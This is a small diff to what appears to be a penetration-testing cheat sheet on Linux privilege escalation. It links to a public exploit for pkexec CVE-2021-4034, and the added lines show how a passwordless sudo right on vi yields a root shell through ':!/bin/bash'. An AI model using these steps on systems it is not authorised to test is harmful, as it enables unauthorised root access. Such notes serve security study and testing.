@@ -42,3 +42,8 @@
 ### Privesc with pkexec(suidbit) ver 0.105(CVE-2021-4034)
    Use this <a href="https://github.com/arthepsy/CVE-2021-4034">exploit</a>
    <a href="https://www.exploit-db.com/exploits/50689">Exploit db's link</a>
+
+### if a user is allowed to run vi as root with no password
+
+             sudo /usr/bin/vi
+             :!/bin/bash
